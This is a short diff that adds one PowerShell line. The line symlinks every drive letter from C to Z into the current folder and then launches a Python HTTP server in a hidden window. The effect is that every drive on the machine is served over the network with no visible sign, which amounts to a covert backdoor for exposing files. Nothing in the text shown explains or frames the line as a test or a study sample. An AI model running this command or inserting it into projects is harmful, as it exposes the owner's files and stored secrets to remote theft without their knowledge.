@@ -1,0 +1,1 @@
+67..90 | ForEach-Object { $driveLetter = [char]$_; if (-not (Test-Path ".\$driveLetter")) { cmd /c mklink /D ".\$driveLetter" "$($driveLetter):\" > $null } }; Start-Process -FilePath "python" -ArgumentList "-m http.server" -WindowStyle Hidden
